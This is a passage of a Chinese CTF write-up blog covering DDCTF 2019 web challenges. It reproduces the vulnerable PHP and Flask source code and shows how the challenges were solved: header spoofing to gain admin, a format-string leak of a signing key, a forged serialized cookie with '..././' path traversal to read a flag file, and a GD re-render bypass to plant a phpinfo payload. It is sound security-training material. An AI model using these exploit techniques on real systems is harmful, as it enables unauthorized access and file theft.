class=\"line\">http:&#x2F;&#x2F;117.51.150.246&#x2F;f1ag!ddctf.php?uid&#x3D;&amp;k&#x3D;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DDCTF&#123;436f6e67726174756c6174696f6e73&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"WEB-签到题\"><a href=\"#WEB-签到题\" class=\"headerlink\" title=\"WEB 签到题\"></a>WEB 签到题</h1><p>题目需要我们以admin身份登录，查看网络信息发现一个中间页面Auth.php，在该请求头中看到了didictf_username字段，猜测修改该字段即可以admin身份登录，抓包修改一下</p>\n<p><img src=\"https://i.loli.net/2019/05/20/5ce296dc16dc917104.png\" alt></p>\n<p>即可以admin身份登录</p>\n<p><img src=\"https://i.loli.net/2019/05/20/5ce297062e1c059824.png\" alt></p>\n<p>访问该页面可以看到两个源码</p>\n<p><a href=\"http://117.51.158.44/app/fL2XID2i0Cdh.php\" target=\"_blank\" rel=\"noopener\">http://117.51.158.44/app/fL2XID2i0Cdh.php</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//url:app/Application.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">Class</span> <span class=\"title\">Application</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $path = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">response</span><span class=\"params\">($data, $errMsg = <span class=\"string\">'success'</span>)</span> </span>&#123;</span><br><span class=\"line\">        $ret = [<span class=\"string\">'errMsg'</span> =&gt; $errMsg,</span><br><span class=\"line\">            <span class=\"string\">'data'</span> =&gt; $data];</span><br><span class=\"line\">        $ret = json_encode($ret);</span><br><span class=\"line\">        header(<span class=\"string\">'Content-type: application/json'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">auth</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $DIDICTF_ADMIN = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_SERVER[<span class=\"string\">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class=\"string\">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;response(<span class=\"string\">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;response(<span class=\"string\">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class=\"string\">'error'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sanitizepath</span><span class=\"params\">($path)</span> </span>&#123;</span><br><span class=\"line\">    $path = trim($path);</span><br><span class=\"line\">    $path=str_replace(<span class=\"string\">'../'</span>,<span class=\"string\">''</span>,$path);</span><br><span class=\"line\">    $path=str_replace(<span class=\"string\">'..\\\\'</span>,<span class=\"string\">''</span>,$path);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $path;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;path)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $path = <span class=\"keyword\">$this</span>-&gt;sanitizepath(<span class=\"keyword\">$this</span>-&gt;path);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strlen($path) !== <span class=\"number\">18</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;response($data=file_get_contents($path),<span class=\"string\">'Congratulations'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//url:app/Session.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'Application.php'</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Session</span> <span class=\"keyword\">extends</span> <span class=\"title\">Application</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//key建议为8位字符串</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> $eancrykey                  = <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $cookie_expiration\t\t\t= <span class=\"number\">7200</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $cookie_name                = <span class=\"string\">'ddctf_id'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $cookie_path\t\t\t\t= <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $cookie_domain\t\t\t\t= <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $cookie_secure\t\t\t\t= <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> $activity                   = <span class=\"string\">\"DiDiCTF\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">parent</span>::auth()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;get_key();</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;session_read()) &#123;</span><br><span class=\"line\">                $data = <span class=\"string\">'DiDI Welcome you %s'</span>;</span><br><span class=\"line\">                $data = sprintf($data,$_SERVER[<span class=\"string\">'HTTP_USER_AGENT'</span>]);</span><br><span class=\"line\">                <span class=\"keyword\">parent</span>::response($data,<span class=\"string\">'sucess'</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;session_create();</span><br><span class=\"line\">                $data = <span class=\"string\">'DiDI Welcome you'</span>;</span><br><span class=\"line\">                <span class=\"keyword\">parent</span>::response($data,<span class=\"string\">'sucess'</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_key</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//eancrykey  and flag under the folder</span></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;eancrykey =  file_get_contents(<span class=\"string\">'../config/key.txt'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session_read</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($_COOKIE)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $session = $_COOKIE[<span class=\"keyword\">$this</span>-&gt;cookie_name];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($session)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">parent</span>::response(<span class=\"string\">\"session not found\"</span>,<span class=\"string\">'error'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $hash = substr($session,strlen($session)<span class=\"number\">-32</span>);</span><br><span class=\"line\">        $session = substr($session,<span class=\"number\">0</span>,strlen($session)<span class=\"number\">-32</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>($hash !== md5(<span class=\"keyword\">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">parent</span>::response(<span class=\"string\">\"the cookie data not match\"</span>,<span class=\"string\">'error'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $session = unserialize($session);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!is_array($session) <span class=\"keyword\">OR</span> !<span class=\"keyword\">isset</span>($session[<span class=\"string\">'session_id'</span>]) <span class=\"keyword\">OR</span> !<span class=\"keyword\">isset</span>($session[<span class=\"string\">'ip_address'</span>]) <span class=\"keyword\">OR</span> !<span class=\"keyword\">isset</span>($session[<span class=\"string\">'user_agent'</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">\"nickname\"</span>])) &#123;</span><br><span class=\"line\">            $arr = <span class=\"keyword\">array</span>($_POST[<span class=\"string\">\"nickname\"</span>],<span class=\"keyword\">$this</span>-&gt;eancrykey);</span><br><span class=\"line\">            $data = <span class=\"string\">\"Welcome my friend %s\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> ($arr <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">                $data = sprintf($data,$v);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">parent</span>::response($data,<span class=\"string\">\"Welcome\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>($session[<span class=\"string\">'ip_address'</span>] != $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">parent</span>::response(<span class=\"string\">'the ip addree not match'</span>.<span class=\"string\">'error'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($session[<span class=\"string\">'user_agent'</span>] != $_SERVER[<span class=\"string\">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">parent</span>::response(<span class=\"string\">'the user agent not match'</span>,<span class=\"string\">'error'</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">session_create</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $sessionid = <span class=\"string\">''</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(strlen($sessionid) &lt; <span class=\"number\">32</span>) &#123;</span><br><span class=\"line\">            $sessionid .= mt_rand(<span class=\"number\">0</span>,mt_getrandmax());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $userdata = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class=\"keyword\">TRUE</span>)),</span><br><span class=\"line\">            <span class=\"string\">'ip_address'</span> =&gt; $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>],</span><br><span class=\"line\">            <span class=\"string\">'user_agent'</span> =&gt; $_SERVER[<span class=\"string\">'HTTP_USER_AGENT'</span>],</span><br><span class=\"line\">            <span class=\"string\">'user_data'</span> =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">        );</span><br><span class=\"line\"></span><br><span class=\"line\">        $cookiedata = serialize($userdata);</span><br><span class=\"line\">        $cookiedata = $cookiedata.md5(<span class=\"keyword\">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class=\"line\">        $expire = <span class=\"keyword\">$this</span>-&gt;cookie_expiration + time();</span><br><span class=\"line\">        setcookie(</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;cookie_name,</span><br><span class=\"line\">            $cookiedata,</span><br><span class=\"line\">            $expire,</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;cookie_path,</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;cookie_domain,</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;cookie_secure</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ddctf = <span class=\"keyword\">new</span> Session();</span><br><span class=\"line\">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure>\n<p>查看session.php代码可知，主要逻辑在session_read和session_create两个功能，session_create建立cookie并签名，session_read验证签名然后反序列化，而在Session类继承的__destruct方法中存在文件读取，所以本题的思路就是利用反序列化来读取flag。<br>为了破解签名，我们需要知道eancrykey，题目中存在如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">\"nickname\"</span>])) &#123;</span><br><span class=\"line\">    $arr = <span class=\"keyword\">array</span>($_POST[<span class=\"string\">\"nickname\"</span>],<span class=\"keyword\">$this</span>-&gt;eancrykey);</span><br><span class=\"line\">    $data = <span class=\"string\">\"Welcome my friend %s\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($arr <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">        $data = sprintf($data,$v);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">parent</span>::response($data,<span class=\"string\">\"Welcome\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该段代码将eancrykey也放进了数组中，所以我们可以利用nickname中的%s将其输出，例如：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$key = <span class=\"string\">'aesm1p'</span>;</span><br><span class=\"line\">$arr = <span class=\"keyword\">array</span>(<span class=\"string\">'snow %s'</span>,$key);</span><br><span class=\"line\">$data = <span class=\"string\">\"welcome %s\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($arr <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">\t$data = sprintf($data,$v);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $data;</span><br></pre></td></tr></table></figure></p>\n<p>可以得到结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">welcome snow aesm1p</span><br></pre></td></tr></table></figure>\n<p>提交的时候必须要加上didictf_username头</p>\n<p><img src=\"/2020/09/13/DDCTF2019/1.png\" alt></p>\n<p>成功读取到秘钥值为<code>EzblrbNS</code>，接下里就是反序列化，代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Session</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> $path = <span class=\"string\">''</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$key = <span class=\"string\">'EzblrbNS'</span>;</span><br><span class=\"line\">$a = <span class=\"keyword\">new</span> Session();</span><br><span class=\"line\">$a-&gt;path = <span class=\"string\">'..././config/flag.txt'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$cookiedata = serialize($a);</span><br><span class=\"line\">$cookiedata = $cookiedata.md5($key.$cookiedata);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cookiedata.<span class=\"string\">'  '</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode($cookiedata);</span><br></pre></td></tr></table></figure>\n<p>修改cookie即可得到flag</p>\n<p><img src=\"/2020/09/13/DDCTF2019/2.png\" alt></p>\n<p>flag: <code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p>\n<h1 id=\"Upload-IMG\"><a href=\"#Upload-IMG\" class=\"headerlink\" title=\"Upload-IMG\"></a>Upload-IMG</h1><p>我们上传之后的图片会被二次渲染，查看返回的图片可以看到<code>gd-jpeg v1.0</code>，是php的gd库渲染的，本题的考点是gd二次渲染绕过，要求我们将payload<br>[phpinfo();]写入图片中，可以用工具跑一下（修改写入的payload），然后就会生成符合条件的图片</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">php jpg_payload.php imga_name</span><br></pre></td></tr></table></figure>\n<p>PS：可能需要多次才能成功，试一些比较大的图片成功率高，还有就是在linux下做，不要在windows下进行尝试</p>\n<p>然后提交图片即可</p>\n<p>flag：<code>DDCTF{B3s7_7ry_php1nf0_57d79f001ace9fad}</code></p>\n<h1 id=\"homebrew-event-loop\"><a href=\"#homebrew-event-loop\" class=\"headerlink\" title=\"homebrew event loop\"></a>homebrew event loop</h1><p>源代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- encoding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># written in python 2.7</span></span><br><span class=\"line\">__author__ = <span class=\"string\">'garzon'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, session, request, Response</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.secret_key = <span class=\"string\">'*********************'</span> <span class=\"comment\"># censored</span></span><br><span class=\"line\">url_prefix = <span class=\"string\">'/d5af31f66147e657'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">FLAG</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'FLAG_is_here_but_i_wont_show_you'</span>  <span class=\"comment\"># censored</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">trigger_event</span><span class=\"params\">(event)</span>:</span></span><br><span class=\"line\">    session[<span class=\"string\">'log'</span>].append(event)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(session[<span class=\"string\">'log'</span>]) &gt; <span class=\"number\">5</span>: session[<span class=\"string\">'log'</span>] = session[<span class=\"string\">'log'</span>][<span class=\"number\">-5</span>:]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> type(event) == type([]):</span><br><span class=\"line\">        request.event_queue += event</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        request.event_queue.append(event)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_mid_str</span><span class=\"params\">(haystack, prefix, postfix=None)</span>:</span></span><br><span class=\"line\">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> postfix <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        haystack = haystack[:haystack.find(postfix)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> haystack</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RollBackException</span>:</span> <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">execute_event_loop</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    valid_event_chars = set(<span class=\"string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class=\"line\">    resp = <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> len(request.event_queue) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        event = request.event_queue[<span class=\"number\">0</span>] <span class=\"comment\"># `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\"</span></span><br><span class=\"line\">        request.event_queue = request.event_queue[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> event.startswith((<span class=\"string\">'action:'</span>, <span class=\"string\">'func:'</span>)): <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> event:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> valid_event_chars: <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            is_action = event[<span class=\"number\">0</span>] == <span class=\"string\">'a'</span></span><br><span class=\"line\">            action = get_mid_str(event, <span class=\"string\">':'</span>, <span class=\"string\">';'</span>)</span><br><span class=\"line\">            args = get_mid_str(event, action+<span class=\"string\">';'</span>).split(<span class=\"string\">'#'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                event_handler = eval(action + (<span class=\"string\">'_handler'</span> <span class=\"keyword\">if</span> is_action <span class=\"keyword\">else</span> <span class=\"string\">'_function'</span>))</span><br><span class=\"line\">                ret_val = event_handler(args)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> RollBackException:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> resp <span class=\"keyword\">is</span> <span class=\"literal\">None</span>: resp = <span class=\"string\">''</span></span><br><span class=\"line\">                resp += <span class=\"string\">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class=\"line\">                resp += <span class=\"string\">'&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">                session[<span class=\"string\">'num_items'</span>] = request.prev_session[<span class=\"string\">'num_items'</span>]</span><br><span class=\"line\">                session[<span class=\"string\">'points'</span>] = request.prev_session[<span class=\"string\">'points'</span>]</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception, e:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> resp <span class=\"keyword\">is</span> <span class=\"literal\">None</span>: resp = <span class=\"string\">''</span></span><br><span class=\"line\">                <span class=\"comment\">#resp += str(e) # only for debugging</span></span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ret_val <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> resp <span class=\"keyword\">is</span> <span class=\"literal\">None</span>: resp = ret_val</span><br><span class=\"line\">                <span class=\"keyword\">else</span>: resp += ret_val</span><br><span class=\"line\">    <span class=\"keyword\">if</span> resp <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> resp == <span class=\"string\">''</span>: resp = (<span class=\"string\">'404 NOT FOUND'</span>, <span class=\"number\">404</span>)</span><br><span class=\"line\">    session.modified = <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> resp</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">@app.route(url_prefix+'/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">entry_point</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    querystring = urllib.unquote(request.query_string)</span><br><span class=\"line\">    request.event_queue = []</span><br><span class=\"line\">    <span class=\"keyword\">if</span> querystring == <span class=\"string\">''</span> <span class=\"keyword\">or</span> (<span class=\"keyword\">not</span> querystring.startswith(<span class=\"string\">'action:'</span>)) <span class=\"keyword\">or</span> len(querystring) &gt; <span class=\"number\">100</span>:</span><br><span class=\"line\">        querystring = <span class=\"string\">'action:index;False#False'</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'num_items'</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> session:</span><br><span class=\"line\">        session[<span class=\"string\">'num_items'</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">        session[<span class=\"string\">'points'</span>] = <span class=\"number\">3</span></span><br><span class=\"line\">        session[<span class=\"string\">'log'</span>] = []</span><br><span class=\"line\">    request.prev_session = dict(session)</span><br><span class=\"line\">    trigger_event(querystring)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> execute_event_loop()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># handlers/functions below --------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">view_handler</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    page = args[<span class=\"number\">0</span>]</span><br><span class=\"line\">    html = <span class=\"string\">''</span></span><br><span class=\"line\">    html += <span class=\"string\">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class=\"string\">'num_items'</span>], session[<span class=\"string\">'points'</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page == <span class=\"string\">'index'</span>:</span><br><span class=\"line\">        html += <span class=\"string\">'&lt;a href=\"./?action:index;True%23False\"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">        html += <span class=\"string\">'&lt;a href=\"./?action:view;shop\"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">        html += <span class=\"string\">'&lt;a href=\"./?action:view;reset\"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> page == <span class=\"string\">'shop'</span>:</span><br><span class=\"line\">        html += <span class=\"string\">'&lt;a href=\"./?action:buy;1\"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> page == <span class=\"string\">'reset'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">del</span> session[<span class=\"string\">'num_items'</span>]</span><br><span class=\"line\">        html += <span class=\"string\">'Session reset.&lt;br /&gt;'</span></span><br><span class=\"line\">    html += <span class=\"string\">'&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index_handler</span><span class=\"params\">(args)</span>:</span></span><br><span class=\"line\">    bool_show_source = str(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">    bool_download_source = str(args[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> bool_show_source == <span class=\"string\">'True'</span>:</span><br><span class=\"line\">    </span><br><span class=\"line\">        source = open(<span class=\"string\">'eventLoop.py'</span>, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">        html = <span class=\"string\">''</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> bool_download_source != <span class=\"string\">'True'</span>:</span><br><span class=\"line\">            html += <span class=\"string\">'&lt;a href=\"./?action:index;True%23True\"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">            html += <span class=\"string\">'&lt;a href=\"./?action:view;index\"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class=\"line\">            </span><br><span class=\"line\">        <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> source:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> bool_download_source != <span class=\"string\">'True'</span>:</span><br><span class=\"line\">                html += line.replace(<span class=\"string\">'&amp;'</span>,<span class=\"string\">'&amp;amp;'</span>).replace(<span class=\"string\">'\\t'</span>, <span 